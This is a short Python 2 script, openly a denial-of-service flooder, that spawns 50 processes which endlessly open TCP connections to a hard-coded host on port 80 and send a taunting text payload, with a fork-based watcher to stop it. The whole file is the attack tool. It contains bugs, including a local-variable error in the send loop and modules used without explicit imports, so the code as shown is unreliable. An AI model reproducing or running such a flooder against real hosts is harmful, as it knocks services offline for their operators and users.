import socket
from scapy.all import *
import multiprocessing
import os

data = ("Hi mudafaka!"
        "this attack is named ddos"
        "wikipedia says ddos attack is a cyber-attack in which the perpetrator seeks to make a machine or network resource unavailable to its intended users by temporarily or indefinitely disrupting services of a host connected to the Internet."
        "dont attack someone innocent"
        "be a good boy"
        "bye mudafaka"
        )


HOST = '192.168.10.1'    #remote host
PORT = 80              #same port used by server


def send_data(list):
    while 1:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        s.sendall(data)
        data = s.recv(1024)
        s.close()
        print 'Received', repr(data)
        print 1

class Watcher():  
  
    def __init__(self):  
        self.child = os.fork()
        if self.child == 0:  
            return  
        else:  
            self.watch()  
  
    def watch(self):  
        try:  
            os.wait()  
        except KeyboardInterrupt:  
            self.kill()  
        sys.exit()  
  
    def kill(self):  
        try:  
            os.kill(self.child, signal.SIGKILL)  
        except OSError:  
            pass


def main():
    Watcher() 
    list  = []
    for i in range(50):
        list.append(111)
    pool = multiprocessing.Pool(processes=50)
    pool.map(send_data,list)
	
if __name__ == "__main__":
    main()
